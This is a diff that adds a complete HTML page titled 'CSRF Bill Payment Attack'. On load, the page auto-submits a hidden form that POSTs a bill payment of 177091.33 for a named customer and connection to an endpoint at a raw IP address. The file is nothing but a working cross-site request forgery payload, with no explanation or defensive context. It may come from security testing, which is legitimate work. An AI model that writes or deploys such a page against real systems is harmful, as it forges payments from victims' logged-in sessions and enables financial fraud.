@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Bill Payment Attack</title>
+</head>
+<body onload="document.forms['csrfForm'].submit()">
+    <form id="csrfForm" action="http://140.245.27.133/bill-payment" method="POST">
+        <input type="hidden" name="bill_id" value="798">
+        <input type="hidden" name="amount" value="177091.33">
+        <input type="hidden" name="customer_id" value="LHR-COM-0004">
+        <input type="hidden" name="connection_id" value="DISCO-COM-1004">
+    </form>
+</body>
+</html>
